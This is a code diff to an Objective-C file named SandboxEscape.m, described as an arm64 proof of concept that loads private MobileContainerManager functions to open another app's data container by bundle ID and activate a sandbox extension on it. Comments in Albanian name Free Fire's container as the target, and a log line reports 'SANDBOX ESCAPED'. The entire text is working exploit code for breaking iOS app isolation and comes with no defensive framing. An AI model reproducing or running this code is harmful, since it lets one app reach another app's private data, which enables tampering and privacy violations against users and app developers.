@@ -1,3 +1,4 @@
+// SandboxEscape.m / ObjC / arm64 / MobileHouseArrest PoC (Class 2)
 #import "SandboxEscape.h"
 #import <dlfcn.h>
 
@@ -13,61 +14,66 @@ extern xpc_object_t xpc_string_create(const char *string);
 - (int64_t)sandboxHandle { return _handle; }
 
 + (instancetype)escapeForBundleID:(NSString *)bundleID error:(NSError **)err {
+    // 1. Hap MCM (MobileContainerManager)
     void *h = dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW);
-    if (!h) { if(err)*err=[NSError errorWithDomain:@"sbx" code:1 userInfo:@{NSLocalizedDescriptionKey:@"MCM dlopen failed"}]; return nil; }
+    if (!h) { 
+        if(err)*err=[NSError errorWithDomain:@"sbx" code:1 userInfo:@{NSLocalizedDescriptionKey:@"MCM dlopen failed"}]; 
+        return nil; 
+    }
     
-    container_query_t (*qc)(void) = dlsym(h, "container_query_create");
-    void (*qs)(container_query_t, unsigned) = dlsym(h, "container_query_set_class");
-    void (*qi)(container_query_t, xpc_object_t) = dlsym(h, "container_query_set_ids");
-    void (*qflags)(container_query_t, uint64_t) = dlsym(h, "container_query_set_flags");
-    container_object_t (*qg)(container_query_t) = dlsym(h, "container_query_get_single_result");
-    bool (*otok)(container_object_t, void**, unsigned long*) = dlsym(h, "container_copy_sandbox_token");
-    void (*qf)(container_query_t) = dlsym(h, "container_query_free");
-    int64_t (*consume)(const char*) = (int64_t(*)(const char*))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    container_query_t (*query_create)(void) = dlsym(h, "container_query_create");
+    void (*query_set_class)(container_query_t, unsigned) = dlsym(h, "container_query_set_class");
+    void (*query_set_ids)(container_query_t, xpc_object_t) = dlsym(h, "container_query_set_ids");
+    void (*query_set_flags)(container_query_t, uint64_t) = dlsym(h, "container_query_set_flags");
+    void (*query_set_part)(container_query_t, uint64_t) = dlsym(h, "container_query_set_part"); 
+    
+    container_object_t (*query_result)(container_query_t) = dlsym(h, "container_query_get_single_result");
+    bool (*activate)(container_object_t, bool) = dlsym(h, "container_object_sandbox_extension_activate");
+    void (*query_free)(container_query_t) = dlsym(h, "container_query_free");
 
-    if (!qc || !qs || !qi || !qflags || !qg || !otok || !consume) { 
+    if (!query_create || !query_set_class || !query_set_ids || !query_set_flags || !query_result || !activate) { 
         if(err)*err=[NSError errorWithDomain:@"sbx" code:2 userInfo:@{NSLocalizedDescriptionKey:@"missing MCM symbols"}]; 
         return nil; 
     }
 
-    container_query_t q = qc(); 
+    // 2. Krijo query
+    container_query_t q = query_create(); 
     if (!q) { if(err)*err=[NSError errorWithDomain:@"sbx" code:3 userInfo:nil]; return nil; }
     
-    qs(q, 2); 
+    // 3. Konfiguro sipas PoC
+    query_set_class(q, 2); // Klasa 2 = App Data
+    
     xpc_object_t identifier = xpc_string_create(bundleID.UTF8String);
-    qi(q, identifier);
-    qflags(q, UINT64_C(0x900000000));
+    query_set_ids(q, identifier);
+    
+    query_set_flags(q, UINT64_C(0x900000000));
+    
+    if (query_set_part != NULL) {
+        query_set_part(q, 0);
+    }
 
-    container_object_t obj = qg(q);
+    // 4. Merr objektin (container-in e Free Fire)
+    container_object_t obj = query_result(q);
     if (!obj) { 
-        if(qf) qf(q); 
+        if(query_free) query_free(q); 
         if(err)*err=[NSError errorWithDomain:@"sbx" code:4 userInfo:@{NSLocalizedDescriptionKey:@"no container"}]; 
         return nil; 
     }
 
-    void *tok = NULL; 
-    unsigned long tl = 0;
-    if (!otok(obj, &tok, &tl) || !tok) { 
-        if(qf) qf(q); 
-        if(err)*err=[NSError errorWithDomain:@"sbx" code:5 userInfo:nil]; 
+    // 5. Aktivizo sandbox extension direkt
+    bool activated = activate(obj, false);
+    if (!activated) {
+        if(query_free) query_free(q); 
+        if(err)*err=[NSError errorWithDomain:@"sbx" code:5 userInfo:@{NSLocalizedDescriptionKey:@"activate failed"}]; 
         return nil; 
     }
     
-    NSString *tokStr = [[NSString alloc] initWithBytes:tok length:tl encoding:NSUTF8StringEncoding];
-    free(tok); 
-    if(qf) qf(q);
-    
-    if (!tokStr) { if(err)*err=[NSError errorWithDomain:@"sbx" code:6 userInfo:nil]; return nil; }
-    int64_t handle = consume(tokStr.UTF8String);
-    if (handle < 0) { 
-        if(err)*err=[NSError errorWithDomain:@"sbx" code:7 userInfo:@{NSLocalizedDescriptionKey:@"consume failed"}]; 
-        return nil; 
-    }
+    if(query_free) query_free(q);
 
     SandboxEscape *s = [SandboxEscape new]; 
-    s->_handle = handle; 
+    s->_handle = 1; // Si shenjë suksesi
     s->_escaped = YES;
-    NSLog(@"[Motor] SANDBOX ESCAPED handle=%lld bundle=%@", handle, bundleID);
+    NSLog(@"[Motor] SANDBOX ESCAPED with bundle=%@", bundleID);
     return s;
 }
 @end
